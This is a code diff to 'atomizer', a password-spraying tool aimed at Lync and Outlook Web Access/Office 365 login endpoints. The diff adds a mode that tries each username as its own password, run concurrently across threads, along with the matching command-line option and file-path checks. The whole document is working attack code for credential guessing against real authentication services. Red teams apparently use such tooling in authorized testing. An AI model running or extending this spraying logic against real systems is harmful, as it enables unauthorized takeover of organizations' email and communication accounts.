@@ -4,6 +4,7 @@
 Usage:
     atomizer (lync|owa) <target> <password> --userfile USERFILE [--threads THREADS] [--debug]
     atomizer (lync|owa) <target> --csvfile CSVFILE [--user-row-name NAME] [--pass-row-name NAME] [--threads THREADS] [--debug]
+    atomizer (lync|owa) <target> --user-as-pass USERFILE [--threads THREADS] [--debug]
     atomizer (lync|owa) <target> --recon [--debug]
     atomizer -h | --help
     atomizer -v | --version
@@ -22,6 +23,7 @@ Options:
     --recon                  only collect info, don't password spray
     --user-row-name NAME     username row title in CSV file [default: Email Address]
     --pass-row-name NAME     password row title in CSV file [default: Password]
+    --user-as-pass USERFILE  use the usernames in the specified file as the password
 """
 
 import logging
@@ -89,9 +91,26 @@ class Atomizer:
 
         auth_function = self.sprayer.auth_O365 if self.sprayer.O365 else self.sprayer.auth
 
+        log.debug('creating executor tasks')
         blocking_tasks = [
             self.loop.run_in_executor(self.executor, partial(auth_function, username=row[user_row_name], password=row[pass_row_name]))
             for row in csvreader
+        ]
+
+        log.debug('waiting for executor tasks')
+        await asyncio.wait(blocking_tasks)
+        log.debug('exiting')
+
+    async def atomize_user_as_pass(self, userfile):
+        log = logging.getLogger('atomize_user_as_pass')
+        log.debug('atomizing...')
+
+        auth_function = self.sprayer.auth_O365 if self.sprayer.O365 else self.sprayer.auth
+
+        log.debug('creating executor tasks')
+        blocking_tasks = [
+            self.loop.run_in_executor(self.executor, partial(auth_function, username=username.strip(), password=username.strip().split('\\')[-1:][0]))
+            for username in userfile
         ]
 
         log.debug('waiting for executor tasks')
@@ -115,11 +134,12 @@ if __name__ == "__main__":
 
     logging.debug(args)
 
-    if args['--userfile'] or args['--csvfile']:
-        inputfile = Path(args['--userfile'] if args['--userfile'] else args['--csvfile'])
-        if not inputfile.exists() or not inputfile.is_file():
-            logging.error(print_bad("Path to --userfile/--csvfile invalid!"))
-            sys.exit(1)
+    for input_file in [args['--userfile'], args['--csvfile'], args['--user-as-pass']]:
+        if input_file:
+            file_path = Path(input_file)
+            if not file_path.exists() or not file_path.is_file():
+                logging.error(print_bad("Path to --userfile/--csvfile/--user-as-pass invalid!"))
+                sys.exit(1)
 
     if args['lync']:
         atomizer.lync()
@@ -149,5 +169,9 @@ if __name__ == "__main__":
                             password=args['<password>']
                         )
                     )
+
+        elif args['--user-as-pass']:
+            with open(args['--user-as-pass']) as userfile:
+                    loop.run_until_complete(atomizer.atomize_user_as_pass(userfile))
 
         atomizer.shutdown()
